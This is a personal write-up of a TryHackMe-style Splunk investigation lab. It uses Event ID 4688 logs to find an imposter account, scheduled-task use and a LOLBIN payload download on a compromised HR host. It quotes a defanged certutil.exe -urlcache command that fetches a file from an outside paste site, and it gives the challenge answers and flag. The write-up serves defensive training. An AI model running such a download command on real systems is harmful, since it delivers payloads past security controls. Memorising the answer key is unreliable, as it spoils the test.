# Benign-THM-Challenge
Write-Up: Suspicious Process Execution Investigation

# Challenge room to investigate a compromised host.

## Objective
Learn more about Splunk and how to investigate the logs.
 Investigate a potential security incident flagged by an IDS, which identified suspicious process execution on an HR department host. 
 Initial findings suggested unauthorized network information gathering and scheduled task execution.

### Skills Learned

- Log Parsing and Analysis: I become familiar with using Splunk to search and filter logs based on specific fields like UserName, ProcessName, and CommandLine, helping to identify unusual or suspicious activity
- Searching for Rare Events: I practice using Splunk queries like rare values to identify outliers or anomalies, such as impersonation or abnormal process executions. This includes finding instances where common processes are being used in an unusual manner, like the use of LOLBINs (Living Off the Land Binaries)
- Investigating Process Execution: I get hands-on experience with process execution analysis, including tracking down which processes were executed by specific users, which is critical for understanding how an attack unfolded
- Identifying Malicious Behavior: By analyzing suspicious activity such as downloads from third-party sites or the execution of potentially malicious payloads.
- Timeline Creation: Splunk help me create a timeline of events related to the attack, such as when a suspicious binary was downloaded, which is useful for both incident response and forensic investigations

### Tools Used

- Splunk

## Steps
Overview:

A host from the HR department was compromised, and suspicious activities were observed on the system. These activities included the execution of scheduled tasks, which confirmed the initial suspicion. The process execution logs were pulled using Event ID: 4688 and ingested into Splunk under the index win_eventlogs for further investigation.

The organization is divided into three departments:

```
IT Department: James, Moin, Katrina
HR Department: Haroon, Chris, Diana
Marketing Department: Bell, Amelia, Deepak

```

Questions & Answers:

**Question 1**: *How many logs are ingested from the month of March, 2022?*

To find the number of logs ingested from March 2022, change the date on the right top corner

Answer: 13,959 logs were ingested during the month of March 2022.

---

**Question 2:** Imposter Alert: There seems to be an imposter account observed in the logs. What is the name of that user?

To identify the imposter user, I searched for usernames not in the list of known users:

`index=win_eventlogs EventID=4688
NOT (UserName="James" OR UserName="Moin" OR UserName="Katrina" OR
UserName="Haroon" OR UserName="Chris" OR UserName="Diana" OR
UserName="Bell" OR UserName="Amelia" OR UserName="Deepak")
| stats count by UserName`

This returned the following suspicious usernames:

```
Amel1a
Chris.fort
Daina

```

Answer: The imposter user is Amel1a.

We can Also use this type of queries

This command returns a unique list of values for a specific field.
Useful when you want to see all distinct values for a field (e.g., unique usernames).
`index=win_eventlogs EventID=4688
| stats values(UserName)`
or
This command counts the occurrences of events grouped by a specific field
Useful when you need to know how many times a specific field (like a user) appears in the logs.
`index=win_eventlogs EventID=4688
| stats count by UserName`

---

**Question 3**: Which user from the HR department was observed running scheduled tasks?

I searched for the execution of the scheduled tasks utility, schtasks.exe, which is commonly used for automated task management.

`index=win_eventlogs EventID=4688
| search ProcessName="*schtasks.exe*"`

Answer: The user who ran scheduled tasks is Chris.fort from the HR department.

---

**Question 4**: Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?

Certutil.exe is a Windows command-line tool used for managing certificates, but it can be exploited by attackers to download malicious payloads. I found Haroon executing the following command:

`index=win_eventlogs EventID=4688
| search ProcessName="*Certutil.exe*"`

Answer: Haroon executed the command:
certutil.exe -urlcache -f -  hxxps[://]controlc[.]com/e4d11035 benign.exe

---

**Question 5**: To bypass the security controls, which system process (LOLBIN) was used to download a payload from the internet?

Answer: The system process used to bypass security controls was Certutil.exe, as it is a legitimate Windows process often overlooked by security systems.

---

**Question 6**: What was the date that this binary was executed by the infected host?

The date of execution was found just below the command line in the logs.

Answer: 2022-03-04.

---

**Question 7:** Which third-party site was accessed to download the malicious payload?

From the command line, I identified the third-party site used for downloading the payload.

Answer:  controlc[.]com

---

**Question 8:** What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

The filename was included in the command line executed by Haroon.

Answer: The file saved was benign.exe.

---

**Question 9**: The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

To find the pattern, I examined the URL provided in the command line, which pointed to the downloaded file.

Answer: The malicious content pattern is: THM{KJ&*H^B0}.

---

**Question 10:** What is the URL that the infected host connected to?

The URL was clearly visible in the executed command line.

Answer: The URL used to download the malicious payload is:
hxxps[://]controlc[.]com/e4d11035

---

**Conclusion**:

*The investigation involved identifying suspicious activities in the HR department's compromised host. By reviewing the logs and searching for specific execution patterns (e.g., use of Certutil.exe and schtasks.exe), we were able to determine the presence of a malicious user and the payload involved. The exploitation utilized a legitimate system tool to bypass security controls and download a payload from a third-party server.*

*Ref 1: Network Diagram*
